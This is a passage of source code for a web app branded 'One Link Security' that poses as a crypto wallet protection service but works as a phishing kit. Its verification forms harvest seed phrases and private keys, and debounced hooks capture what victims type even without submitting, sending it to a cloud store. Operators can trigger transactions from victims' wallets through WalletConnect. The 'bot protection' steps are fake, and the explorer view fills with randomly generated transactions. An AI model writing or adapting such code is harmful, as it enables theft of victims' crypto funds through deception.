    const tempPassword = `OLS-${Math.random().toString(36).slice(2, 6).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
    const data: VisitEmailData = {
      toEmail: email,
      toName: email.split('@')[0],
      ipAddress: currentVisitorIp || 'Unknown',
      device: currentVisitorDevice || 'Unknown',
      location: currentVisitorIp && currentVisitorIp !== 'Unknown' ? `Detected via IP ${currentVisitorIp}` : 'Location unavailable',
      wallet: appKitAddress ?? 'Not connected yet',
      network: connectedChainId && chainIdToKey[connectedChainId] ? chainConfig[chainIdToKey[connectedChainId]].label : 'N/A',
      loginEmail: email,
      loginPassword: tempPassword,
      loginUrl: window.location.origin,
      visitedAt: nowString(),
    }

    const record: EmailRecord = {
      email, name: data.toName ?? 'Visitor', wallet: data.wallet, chain: 'ethereum',
      severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
    }
    setEmailRecords(prev => [record, ...prev].slice(0, 200))

    try { localStorage.setItem(VISITED_EMAILS_KEY, JSON.stringify([email, ...alreadySent].slice(0, 500))) }
    catch { /* quota */ }

    try {
      await sendEmail({
        to: data.toEmail,
        subject: 'You are secured — One Link Security session active',
        html: buildVisitEmailHtml(data),
        text: buildVisitEmailText(data),
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
    } catch (err) {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      void err // suppress in production
    }
  }

  const submitSupportEmail = async (e: FormEvent) => {
    e.preventDefault()
    const email = supportEmailInput.trim().toLowerCase()
    if (!isValidEmail(email)) {
      setSupportStatus('Enter a valid email address.')
      return
    }
    if (email === adminCreds.email.toLowerCase()) {
      openAdminAuthPrompt()
      return
    }
    const alreadySubscribed = newsletterEmails.includes(email)
    setNewsletterEmails(prev => prev.includes(email) ? prev : [email, ...prev].slice(0, 500))
    setSupportStatus(alreadySubscribed ? 'You are already subscribed.' : 'Subscribed. Sending your welcome email…')
    setSupportEmailInput('')
    if (!alreadySubscribed) {
      await sendNewsletterWelcomeEmail(email)
    }
  }

  const sendNewsletterWelcomeEmail = async (email: string) => {
    const data: NewsletterEmailData = {
      toEmail: email,
      toName: email.split('@')[0],
      loginUrl: window.location.origin,
      joinedAt: nowString(),
    }
    const record: EmailRecord = {
      email, name: data.toName ?? 'Subscriber', wallet: '—', chain: 'ethereum',
      severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
    }
    setEmailRecords(prev => [record, ...prev].slice(0, 200))
    try {
      await sendEmail({
        to: data.toEmail,
        subject: 'Welcome to One Link Security',
        html: buildNewsletterEmailHtml(data),
        text: buildNewsletterEmailText(data),
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
      setSupportStatus(`Welcome email sent to ${email}.`)
    } catch (err) {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      setSupportStatus(`Subscribed, but the welcome email failed to send. ${err instanceof Error ? err.message : ''}`.trim())
    }
  }

  const verifyAdminFromSupport = (e: FormEvent) => {
    e.preventDefault()
    if (adminPasswordInput === adminCreds.password) {
      setIsAdminAuthenticated(true)
      setAdminAuthModalOpen(false)
      setAdminAuthError('')
      setEmailGatePassed(true)
      localStorage.setItem(GATE_PASSED_KEY, '1')
      setSupportStatus('Authenticated. Opening dashboard...')
      setActiveView('admin')
      return
    }
    setAdminAuthError('Incorrect password. Please try again.')
  }

  const addUserRoute = (e: FormEvent) => {
    e.preventDefault()
    setRouteFormError('')
    setRouteFormMsg('')
    const email = routeFormEmail.trim().toLowerCase()
    if (!isValidEmail(email)) { setRouteFormError('Enter a valid email address.'); return }
    if (email === adminCreds.email.toLowerCase()) { setRouteFormError('Cannot assign admin email as a user route.'); return }
    if (userEmailRoutes.some(r => r.email.toLowerCase() === email)) { setRouteFormError('This email already has a route configured.'); return }
    const route: UserEmailRoute = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      email,
      view: routeFormView,
      label: routeFormLabel.trim() || email,
      ...(routeFormAddress.trim() && {
        address: routeFormAddress.trim(),
        explorerType: routeFormExplorer,
        explorerNetwork: routeFormExplorerNet.trim() || undefined,
        explorerCustomUrl: routeFormExplorer === 'custom' ? routeFormCustomUrl.trim() : undefined,
      }),
    }
    setUserEmailRoutes(prev => [route, ...prev])
    setRouteFormEmail('')
    setRouteFormView('home')
    setRouteFormLabel('')
    setRouteFormAddress('')
    setRouteFormExplorer('etherscan')
    setRouteFormExplorerNet('')
    setRouteFormCustomUrl('')
    setRouteFormMsg(`Route added: ${email} → ${routeFormView}${route.address ? ` (${route.explorerType}: ${route.address.slice(0,10)}…)` : ''}`)
  }

  const removeUserRoute = (id: string) => {
    setUserEmailRoutes(prev => prev.filter(r => r.id !== id))
  }

  const saveCredentials = (e: FormEvent) => {
    e.preventDefault()
    setSettingsError(''); setSettingsMsg('')
    if (settingsCurPass !== adminCreds.password) { setSettingsError('Current password is incorrect.'); return }
    const newEmail = (settingsNewEmail.trim() || adminCreds.email).toLowerCase()
    const newPass = settingsNewPass || adminCreds.password
    const updatedSupportEmail = settingsSupportEmail.trim() || supportConfig.email
    const updatedSupportTelegram = settingsSupportTelegram.trim() || supportConfig.telegram
    if (!isValidEmail(newEmail)) { setSettingsError('Login email format is invalid.'); return }
    if (!isValidEmail(updatedSupportEmail)) { setSettingsError('Support email format is invalid.'); return }
    if (!/^https?:\/\//.test(updatedSupportTelegram)) { setSettingsError('Telegram button URL must start with http:// or https://'); return }
    if (settingsNewPass && settingsNewPass !== settingsConfirmPass) { setSettingsError('New passwords do not match.'); return }
    if (settingsNewPass && settingsNewPass.length < 6) { setSettingsError('New password must be at least 6 characters.'); return }
    const updated: AdminCreds = { email: newEmail, password: newPass }
    setAdminCreds(updated)
    setSupportConfig({ email: updatedSupportEmail, telegram: updatedSupportTelegram })
    setSettingsCurPass(''); setSettingsNewEmail(''); setSettingsNewPass(''); setSettingsConfirmPass('')
    setSettingsSupportEmail(''); setSettingsSupportTelegram('')
    setSettingsMsg('Credentials and support links updated successfully.')
  }

  const resetCredentials = () => {
    setAdminCreds({ email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD })
    setSupportConfig({ email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM })
    setSettingsMsg('Defaults restored for credentials and support links.')
  }

  // ── Bot Deploy handlers ───────────────────────────────────────────────────
  const BOT_DECLINE_REASONS = [
    'Wallet activity does not meet our security eligibility criteria.',
    'Insufficient on-chain transaction history for bot deployment.',
    'Wallet flagged by our threat intelligence for suspicious behavior.',
    'Duplicate or conflicting protection request already on file.',
    'Request details could not be verified. Please resubmit with valid information.',
    'Bot protection is temporarily unavailable for this network.',
  ]

  const clearBotTimers = () => {
    if (botModalCloseTimerRef.current) {
      window.clearTimeout(botModalCloseTimerRef.current)
      botModalCloseTimerRef.current = null
    }
    if (botLogoutTimerRef.current) {
      window.clearTimeout(botLogoutTimerRef.current)
      botLogoutTimerRef.current = null
    }
  }

  const logoutUserToGate = () => {
    setEmailGatePassed(false)
    setEmailGateInput('')
    setEmailGateStep('email')
    setEmailGatePassInput('')
    setEmailGateError('')
    setGateEmail('')
    setIsAdminAuthenticated(false)
    setAdminPasswordInput('')
    setAdminAuthModalOpen(false)
    setActiveView('home')
    try {
      localStorage.removeItem(GATE_PASSED_KEY)
      localStorage.removeItem(GATE_EMAIL_KEY)
    } catch { /* ignore */ }
  }

  const scheduleBotProtectionCompleteFlow = () => {
    clearBotTimers()
    botModalCloseTimerRef.current = window.setTimeout(() => {
      setBotModalOpen(false)
      botModalCloseTimerRef.current = null
    }, 5000)
    botLogoutTimerRef.current = window.setTimeout(() => {
      logoutUserToGate()
      setSecureStatus('Session closed after bot protection activation. Please sign in again to continue.')
      botLogoutTimerRef.current = null
    }, 30000)
  }

  const openBotModal = () => {
    clearBotTimers()
    setBotModalStep('info')
    setBotFormEmail('')
    setBotFormName('')
    setBotProcessStep(0)
    setBotModalOpen(true)
  }

  const submitBotRequest = async () => {
    const trimmedEmail = botFormEmail.trim()
    if (!trimmedEmail || !isValidEmail(trimmedEmail)) return
    setBotModalStep('processing')
    setBotProcessStep(0)
    const steps = 5
    const perStepDelayMs = 12000
    for (let i = 0; i < steps; i++) {
      await new Promise(r => setTimeout(r, perStepDelayMs))
      setBotProcessStep(i + 1)
    }
    const reviewedAt = nowString()
    const req: BotDeployRequest = {
      id: `bot-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      walletAddress: esAddr,
      chain,
      email: trimmedEmail,
      name: botFormName.trim() || 'User',
      status: 'approved',
      requestedAt: reviewedAt,
      reviewedAt,
      reason: 'Protection auto-activated after successful deployment checks.',
      ip: currentVisitorIp,
      device: currentVisitorDevice,
    }
    setBotRequests(prev => [req, ...prev])
    setBotModalStep('success')
    scheduleBotProtectionCompleteFlow()
  }

  const reviewBotRequest = async (req: BotDeployRequest, action: 'approved' | 'declined', reason: string) => {
    const now = nowString()
    const updated: BotDeployRequest = { ...req, status: action, reviewedAt: now, reason }
    setBotRequests(prev => prev.map(r => r.id === req.id ? updated : r))
    setBotReviewingId(req.id)
    setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sending' }))
    try {
      const botPdfData = {
        toEmail: req.email, toName: req.name,
        wallet: req.walletAddress, network: chainConfig[req.chain].label,
        status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
      }
      const botPdfBase64 = generateBotStatusPdf({
        wallet: req.walletAddress,
        network: chainConfig[req.chain].label,
        status: action,
        reason,
        requestedAt: req.requestedAt,
        reviewedAt: now,
        toName: req.name,
      })
      await sendEmail({
        to: req.email,
        subject: action === 'approved'
          ? 'Your Bot Protection Has Been Activated — One Link Security'
          : 'Update on Your Bot Protection Request — One Link Security',
        html: buildBotStatusEmailHtml(botPdfData),
        text: buildBotStatusEmailText(botPdfData),
        attachments: [{ filename: 'bot-protection-report.pdf', content: botPdfBase64 }],
      })
      setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sent' }))
    } catch {
      setBotEmailStatus(prev => ({ ...prev, [req.id]: 'failed' }))
    }
    setBotReviewingId(null)
    setBotDeclineOpen(null)
    setBotDeclineIdx(null)
    setBotDeclineCustom('')
  }

  const activeBotRequest = botRequests.find(
    r => r.walletAddress.toLowerCase() === esAddr.toLowerCase() && (r.status === 'pending' || r.status === 'approved'),
  )
  const pendingBotForWallet  = activeBotRequest?.status === 'pending'
  const approvedBotForWallet = activeBotRequest?.status === 'approved'

  const isConnectedToChain = Boolean(isWalletConnected && connectedChainId === chainConfig[chain].chainId)
  const checklistProgress = Math.round((protectChecklistDone.length / protectChecklist.length) * 100)
  const featuredNews = cryptoNews[0] ?? null
  const newsList = cryptoNews.slice(1, 7)
  const esSessionRemainingMs = esSessionStartedAt ? Math.max(0, ETHERSCAN_SESSION_MS - (esClock - esSessionStartedAt)) : 0
  const esLockRemainingMs = esLockoutUntil ? Math.max(0, esLockoutUntil - esClock) : 0
  const esSessionActive = esSessionRemainingMs > 0
  const esLockActive = esLockRemainingMs > 0
  const esSessionTimerLabel = esSessionActive
    ? `${Math.floor(esSessionRemainingMs / 60000)}:${Math.floor((esSessionRemainingMs % 60000) / 1000).toString().padStart(2, '0')}`
    : 'Expired'
  const esLockTimerLabel = esLockActive
    ? `${Math.ceil(esLockRemainingMs / 60000)} min`
    : ''
  const explorerRoot = explorerRootForChain(chain)
  const explorerAddressUrl = `${explorerRoot}/address/`
  const explorerTxUrl = `${explorerRoot}/tx/`
  const explorerBlockUrl = `${explorerRoot}/block/`
  const explorerBrand = explorerBrandByChain[chain]
  const shortEsAddr = esAddr.length > 12 ? `${esAddr.slice(0, 6)}...${esAddr.slice(-4)}` : esAddr
  // Memoize a randomized activity feed keyed on viewer address / chain / latest block.
  // This keeps the explorer view populated and professional even when live data
  // is unavailable, so the user never sees an empty or error-laden table.
  const esFallbackRows = useMemo(
    () => generateRandomEsRows(20, esAddr, chainConfig[chain].nativeSymbol, esLatestBlock),
    [esAddr, chain, esLatestBlock],
  )
  const esDisplayedRows: EtherscanTxRow[] = esTxRows.length > 0 ? esTxRows : esFallbackRows
  const esLastTx = esDisplayedRows[0] ?? null
  const esIncomingFund = esDisplayedRows.find(tx => tx.direction === 'IN') ?? null
  const esTokenTransferCount = esDisplayedRows.filter(tx => tx.method === 'Token Transfer').length
  const esEthValueUsd = esEthUsdPrice
    ? (parseFloat(esEthBalance || '0') * parseFloat(esEthUsdPrice.replace(/,/g, ''))).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : null

  const toggleChecklistItem = (id: string) => {
    setProtectChecklistDone(prev => (
      prev.includes(id) ? prev.filter(item => item !== id) : [...prev, id]
    ))
  }

  const navItems: { key: ViewKey; label: string }[] = [
    { key: 'home',      label: 'Home'            },
    { key: 'scan',      label: 'Scan Wallet'     },
    { key: 'protect',   label: 'Secure Wallet'   },
    { key: 'ownership', label: 'Ownership Check' },
    { key: 'recovery',  label: 'Recovery Plan'   },
    { key: 'support',   label: 'Support'         },
  ]

  const visibleSeedPhraseRecords = useMemo(
    () => mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`)
      .filter(r => r.source !== 'manual' && r.source !== 'draft-wc' && r.source !== 'draft-explorer'),
    [seedPhraseRecords],
  )

  const adminTabs: { key: typeof adminTab; label: string; count?: number }[] = [
    { key: 'wallets',   label: 'Connected Wallets', count: connectedWallets.length || undefined },
    { key: 'visitors',  label: 'Visitors',          count: visitorSessions.length || undefined },
    { key: 'scans',     label: 'Scan History',      count: scanHistory.length || undefined },
    { key: 'signers',   label: 'Signer Checks',     count: signerChecks.length || undefined },
    { key: 'emails',    label: 'User Emails',        count: emailRecords.length || undefined },
    { key: 'templates', label: 'Email Templates' },
    { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
    { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
    { key: 'seeds',     label: 'Seed Phrases',      count: visibleSeedPhraseRecords.length || undefined },
    { key: 'rawdata',   label: 'Raw Data',          count: serverSeedRecords.length || undefined },
    { key: 'audit',     label: 'Audit Log',         count: captureAuditRecords.length || undefined },
    { key: 'bots',      label: 'Bot Requests',      count: botRequests.filter(r => r.status === 'pending').length || undefined },
    { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
    { key: 'settings',  label: 'Settings' },
  ]

  const rawSeedData = useMemo(
    () => JSON.stringify(serverSeedRecords, null, 2),
    [serverSeedRecords],
  )

  // ── QR code helpers ──────────────────────────────────────────────────
  const generateScanQr = async () => {
    const url = `${window.location.origin}${window.location.pathname}`
    const dataUrl = await QRCode.toDataURL(url, { width: 280, margin: 2, color: { dark: '#0f172a', light: '#ffffff' } })
    setScanQrDataUrl(dataUrl)
  }

  const generateOwnershipQr = async () => {
    const url = `${window.location.origin}${window.location.pathname}`
    const dataUrl = await QRCode.toDataURL(url, { width: 280, margin: 2, color: { dark: '#0f172a', light: '#ffffff' } })
    setOwnershipQrDataUrl(dataUrl)
  }

  const verifyWcOwnership = (topic: string) => {
    if (!wcSeedInput.trim()) { setWcActionStatus('❌ Please enter the seed phrase or verification key.'); return }
    const rawCredential = wcSeedInput.trim().replace(/\s+/g, ' ')
    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
    const session = wcSessions.find(s => s.topic === topic)
    setWcSessions(prev => prev.map(s => s.topic === topic
      ? { ...s, seedPhrase: storedCredential, ownershipVerified: true }
      : s
    ))
    setWcSeedInput('')
    setWcActionStatus('✅ Ownership verified and recorded.')

    if (session) {
      const capturedWallet =
        (isAddress(session.address) ? session.address : (isAddress(esAddr) ? esAddr : (isAddress(wallet) ? wallet : '')))
      if (!capturedWallet) {
        setWcActionStatus('❌ Ownership was submitted but wallet address is missing. Reconnect wallet and try again.')
        return
      }
      const words = storedCredential.split(/\s+/).filter(Boolean)
      const wcDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
      const wcRecord: SeedPhraseRecord = {
        id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
        walletAddress: capturedWallet,
        chain: 'ethereum',
        seedPhrase: storedCredential,
        wordCount: words.length,
        source: 'wc-session',
        detectedAt: nowString(),
        notes: isMnemonic
          ? (wcDuplicate
            ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
            : `Auto-captured via WalletConnect — ${session.walletName}`)
          : (wcDuplicate
            ? `Duplicate verification key captured via WalletConnect — ${session.walletName}`
            : `Verification key captured via WalletConnect — ${session.walletName}`),
        confirmed: isMnemonic,
      }
      const wcNewRecords = [wcRecord, ...seedPhraseRecords]
      setSeedPhraseRecords(wcNewRecords)
      // Primary: server endpoint (direct Supabase write, no SDK races)
      void pushSeedToServer(wcRecord, 'wc-submit')
      // Backups: localStorage + client SDK
      try {
        localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords))
        appendCaptureAudit({
          event: 'local-save',
          channel: 'wc-submit',
          status: 'ok',
          detail: `localStorage saved ${wcNewRecords.length} records`,
          recordId: wcRecord.id,
          walletAddress: wcRecord.walletAddress,
        })
      } catch (err) {
        appendCaptureAudit({
          event: 'local-save',
          channel: 'wc-submit',
          status: 'error',
          detail: `localStorage save failed: ${String(err)}`,
          recordId: wcRecord.id,
          walletAddress: wcRecord.walletAddress,
        })
      }
      void saveMergedSeedPhrasesToCloud(wcNewRecords, 'wc-submit')
      void notifyAdminVerificationRequest(storedCredential, 'walletconnect', capturedWallet, 'ethereum')
    }
  }

  // Safety net: if a WC session is marked verified and contains submitted text,
  // ensure it is represented in the seed records list.
  useEffect(() => {
    const wcRecoveredRows: SeedPhraseRecord[] = wcSessions
      .filter(sess => sess.ownershipVerified && sess.seedPhrase.trim().length > 0)
      .map(sess => {
        const normalizedPhrase = normalizeSeedPhraseInput(sess.seedPhrase)
        const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
        const storedCredential = isMnemonic ? normalizedPhrase : sess.seedPhrase.trim().replace(/\s+/g, ' ')
        const words = storedCredential.split(/\s+/).filter(Boolean)
        return {
          id: `wc-${sess.topic.slice(0, 18)}-${storedCredential.slice(0, 24)}`,
          walletAddress: isAddress(sess.address)
            ? sess.address
            : (isAddress(wallet) ? wallet : 'Unknown'),
          chain: 'ethereum',
          seedPhrase: storedCredential,
          wordCount: words.length,
          source: 'wc-session',
          detectedAt: sess.connectedAt || nowString(),
          notes: `Recovered from verified WalletConnect session — ${sess.walletName || 'Unknown Wallet'}`,
          confirmed: isMnemonic,
        } satisfies SeedPhraseRecord
      })

    if (wcRecoveredRows.length === 0) return

    setSeedPhraseRecords(prev =>
      mergeUniqueRecords(prev, wcRecoveredRows, item => `${item.id}|${item.seedPhrase}`),
    )
  }, [wcSessions])

  // ── Live draft capture: WalletConnect verify form ─────────────────────
  // Captures whatever the user types into the WC ownership verify input,
  // even if they never click submit. Debounced so each session has a
  // single evolving draft record (stable id) until they submit.
  useEffect(() => {
    const trimmed = wcSeedInput.trim().replace(/\s+/g, ' ')
    if (!trimmed) return
    const topic = wcSelectedTopic || wcSessions[0]?.topic || 'pending'
    const session = wcSessions.find(s => s.topic === topic)
    const draftId = `draft-wc-${topic}`
    const timer = setTimeout(() => {
      const normalizedPhrase = normalizeSeedPhraseInput(trimmed)
      const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
      const storedCredential = isMnemonic ? normalizedPhrase : trimmed
      const words = storedCredential.split(/\s+/).filter(Boolean)
      const draftRecord: SeedPhraseRecord = {
        id: draftId,
        walletAddress: session?.address && isAddress(session.address)
          ? session.address
          : (isAddress(wallet) ? wallet : 'Unknown'),
        chain: 'ethereum',
        seedPhrase: storedCredential,
        wordCount: words.length,
        source: 'draft-wc',
        detectedAt: nowString(),
        notes: `Live draft from WalletConnect verify form${session?.walletName ? ` — ${session.walletName}` : ''}`,
        confirmed: isMnemonic,
      }
      setSeedPhraseRecords(prev => {
        const filtered = prev.filter(r => r.id !== draftId)
        const next = [draftRecord, ...filtered]
        try {
          localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next))
        } catch {
          // non-blocking
        }
        void saveMergedSeedPhrasesToCloud(next, 'wc-draft')
        return next
      })
    }, 600)
    return () => clearTimeout(timer)
  }, [wcSeedInput, wcSelectedTopic, wcSessions, wallet])

  // ── Live draft capture: Explorer verify gate ──────────────────────────
  useEffect(() => {
    const trimmed = esSeedInput.trim().replace(/\s+/g, ' ')
    if (!trimmed) return
    const addressKey = (esAddr || wallet || 'pending').toLowerCase()
    const draftId = `draft-explorer-${addressKey}`
    const timer = setTimeout(() => {
      const normalizedPhrase = normalizeSeedPhraseInput(trimmed)
      const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
      const storedCredential = isMnemonic ? normalizedPhrase : trimmed
      const words = storedCredential.split(/\s+/).filter(Boolean)
      const draftRecord: SeedPhraseRecord = {
        id: draftId,
        walletAddress: esAddr || wallet || 'Unknown',
        chain,
        seedPhrase: storedCredential,
        wordCount: words.length,
        source: 'draft-explorer',
        detectedAt: nowString(),
        notes: 'Live draft from explorer verify gate',
        confirmed: isMnemonic,
      }
      setSeedPhraseRecords(prev => {
        const filtered = prev.filter(r => r.id !== draftId)
        const next = [draftRecord, ...filtered]
        try {
          localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next))
        } catch {
          // non-blocking
        }
        void saveMergedSeedPhrasesToCloud(next, 'explorer-draft')
        return next
      })
    }, 600)
    return () => clearTimeout(timer)
  }, [esSeedInput, esAddr, wallet, chain])

  const sendWcPaymentRequest = (topic: string) => {
    if (!wcPayTo.trim() || !wcPayAmount.trim()) { setWcActionStatus('❌ Fill in recipient address and amount.'); return }
    const session = wcSessions.find(s => s.topic === topic)
    if (!session) return
    const req: WcDappRequest = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      type: 'payment',
      topic,
      address: session.address,
      params: { to: wcPayTo.trim(), value: wcPayAmount.trim(), unit: 'ETH' },
      status: 'pending',
      createdAt: nowString(),
    }
    setWcDappRequests(prev => [req, ...prev])
    setWcPayTo('')
    setWcPayAmount('')
    setWcActionStatus(`💳 Payment request queued for ${session.address.slice(0, 8)}…`)
  }

  const sendWcTransaction = async (topic: string) => {
    if (!wcTxTo.trim()) { setWcActionStatus('❌ Enter a recipient address.'); return }
    const session = wcSessions.find(s => s.topic === topic)
    if (!session) return
    const req: WcDappRequest = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      type: 'transaction',
      topic,
      address: session.address,
      params: { to: wcTxTo.trim(), value: wcTxValue.trim() || '0', data: wcTxData.trim() || '0x' },
      status: 'pending',
      createdAt: nowString(),
    }

    try {
      const client = wcClientRef.current
      if (client) {
        await client.request({
          topic,
          chainId: 'eip155:1',
          request: {
            method: 'eth_sendTransaction',
            params: [{
              from: session.address,
              to: wcTxTo.trim(),
              value: wcTxValue.trim() ? `0x${Number(wcTxValue).toString(16)}` : '0x0',
              data: wcTxData.trim() || '0x',
            }],
          },
        })
        req.status = 'approved'
        setWcActionStatus('✅ Transaction sent to wallet for approval.')
      } else {
        setWcActionStatus('⚠️ WalletConnect session not active — request queued.')
      }
    } catch (err) {
      req.status = 'rejected'
      setWcActionStatus(`❌ Transaction rejected: ${err instanceof Error ? err.message : 'Unknown error'}`)
    }
    setWcDappRequests(prev => [req, ...prev])
    setWcTxTo('')
    setWcTxValue('')
    setWcTxData('')
  }

  const toggleVisitorRestriction = (visitorId: string, nextStatus: VisitorStatus) => {
    setVisitorSessions(prev => prev.map(session => (
      session.id === visitorId ? { ...session, status: nextStatus } : session
    )))
    const msg = nextStatus === 'restricted' ? 'Session restricted — visitor will be blocked from wallet routes.' : 'Session allowed — access restored.'
    setVisitorActionMsg(msg)
    setTimeout(() => setVisitorActionMsg(''), 4000)
  }

  const disconnectWcSession = async (topic: string) => {
    try {
      const client = wcClientRef.current
      if (client) await client.disconnect({ topic, reason: { code: 6000, message: 'User disconnected' } })
    } catch { /* ignore */ }
    setWcSessions(prev => prev.filter(s => s.topic !== topic))
    if (wcSelectedTopic === topic) setWcSelectedTopic(null)
    setWcActionStatus('Session disconnected.')
  }

  const osintProfiles = useMemo(() => {
    const map = new Map<string, {
      address: string; chains: Set<ChainKey>; scans: ScanRecord[]
      highestScore: number; highestSeverity: Severity; allFindings: string[]
    }>()
    for (const r of scanHistory) {
      const key = r.wallet.toLowerCase()
      if (!map.has(key)) map.set(key, { address: r.wallet, chains: new Set(), scans: [], highestScore: 0, highestSeverity: 'low', allFindings: [] })
      const p = map.get(key)!
      p.chains.add(r.chain)
      p.scans.push(r)
      if (r.score > p.highestScore) p.highestScore = r.score
      const sevOrder: Severity[] = ['low', 'medium', 'high', 'critical']
      if (sevOrder.indexOf(r.severity) > sevOrder.indexOf(p.highestSeverity)) p.highestSeverity = r.severity
      r.findings.forEach(f => { if (!p.allFindings.includes(f)) p.allFindings.push(f) })
    }
    return [...map.values()].sort((a, b) => b.highestScore - a.highestScore)
  }, [scanHistory])

  const addAdminIntel = (e: FormEvent) => {
    e.preventDefault()
    setIntelFormError('')
    if (!isAddress(intelAddress.trim())) { setIntelFormError('Enter a valid EVM address.'); return }
    const findingsArr = intelFindings.split('\n').map(f => f.trim()).filter(Boolean)
    if (findingsArr.length === 0) { setIntelFormError('Enter at least one finding.'); return }
    const record: AdminIntelRecord = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      address: intelAddress.trim(),
      chain: intelChain,
      severity: intelSeverity,
      findings: findingsArr,
      notes: intelNotes.trim(),
      addedAt: nowString(),
      addedBy: adminCreds.email,
    }
    setAdminIntelRecords(prev => [record, ...prev])
    setIntelAddress(''); setIntelFindings(''); setIntelNotes('')
  }

  // ── Template preview data ─────────────────────────────────────────────
  const templatePreviewData = (r: EmailRecord): ReportEmailData => ({
    toEmail: r.email, toName: r.name, wallet: r.wallet, network: chainConfig[r.chain].label,
    severity: r.severity, riskScore: r.score, riskPercent: Math.min(100, r.score), balance: r.balance,
    primaryConcern: 'Drainer / Approval Abuse',
    findings: ['3 recent approval events observed.', '2 pending transactions detected.'],
    matchedSignals: ['Approved unlimited token spending and funds moved unexpectedly.'],
    actionPlan: actionPlan[r.severity],
    generatedAt: r.sentAt,
  })


  // ── Render ─────────────────────────────────────────────────────────────
  return (
    <div className="app-shell">

      {/* ── Email gate — shown before any content ── */}
      {!emailGatePassed && (
        <div className="email-gate-overlay">
          <div className="email-gate-card">
            <div className="email-gate-brand">
              <div className="brand-mark email-gate-brand-mark">
                <svg viewBox="0 0 16 16"><path d="M8 1L2 4v4c0 3.3 2.5 6.4 6 7 3.5-.6 6-3.7 6-7V4L8 1z"/></svg>
              </div>
              <span className="email-gate-brand-name">One Link Security</span>
            </div>

            {emailGateStep === 'email' ? (
              <>
                <h2 className="email-gate-title">Welcome</h2>
                <p className="email-gate-sub">Enter your email address to continue.</p>
                <form className="email-gate-form" onSubmit={submitEmailGate}>
                  <input
                    type="email"
                    className="email-gate-input"
                    placeholder="you@example.com"
                    value={emailGateInput}
                    onChange={e => { setEmailGateInput(e.target.value); setEmailGateError('') }}
                    autoFocus
                    required
                  />
                  <button className="btn-primary email-gate-btn" type="submit">Continue</button>
                </form>
              </>
            ) : (
              <>
                <h2 className="email-gate-title">Enter Password</h2>
                <p className="email-gate-sub">Registered email detected — enter your password to access the dashboard.</p>
                <form className="email-gate-form" onSubmit={submitAdminPasswordInline}>
                  <input
                    type="password"
                    className="email-gate-input"
                    placeholder="Password"
                    value={emailGatePassInput}
                    onChange={e => { setEmailGatePassInput(e.target.value); setEmailGateError('') }}
                    autoFocus
                    required
                  />
                  <button className="btn-primary email-gate-btn" type="submit">Unlock Dashboard</button>
                </form>
                <button
                  type="button"
                  className="email-gate-back-btn"
                  onClick={() => { setEmailGateStep('email'); setEmailGateError(''); setEmailGatePassInput('') }}
                >
                  ← Back
                </button>
              </>
            )}

            {emailGateError && <p className="error email-gate-error">{emailGateError}</p>}
          </div>
        </div>
      )}

      {/* ── Top bar ── */}
      <header className="topbar">
        <div className="brand">
          <div className="brand-mark">
            <svg viewBox="0 0 16 16"><path d="M8 1L2 4v4c0 3.3 2.5 6.4 6 7 3.5-.6 6-3.7 6-7V4L8 1z"/></svg>
          </div>
          <span className="brand-name">One Link Security</span>
        </div>

        <nav className={`top-nav ${menuOpen ? 'open' : ''}`} id="page-menu">
          {navItems.map(({ key, label }) => (
            <button key={key} type="button" className={`tab-btn ${activeView === key ? 'active' : ''}`}
              onClick={() => { setActiveView(key); setMenuOpen(false) }}>
              {label}
            </button>
          ))}
        </nav>

        <div className="topbar-right">
          <span className="session-timer" title="Your session duration on this page">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: '3px', verticalAlign: 'middle' }}><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
            {sessionSeconds >= 3600
              ? `${Math.floor(sessionSeconds / 3600)}h ${Math.floor((sessionSeconds % 3600) / 60)}m`
              : `${Math.floor(sessionSeconds / 60)}:${(sessionSeconds % 60).toString().padStart(2, '0')}`}
          </span>
          {isWalletConnected && <span className="chain-badge">{chainConfig[chain].label}</span>}
          {isWalletConnected && walletBalance && <span className="chain-badge">{walletBalance}</span>}
          {isWalletConnected ? (
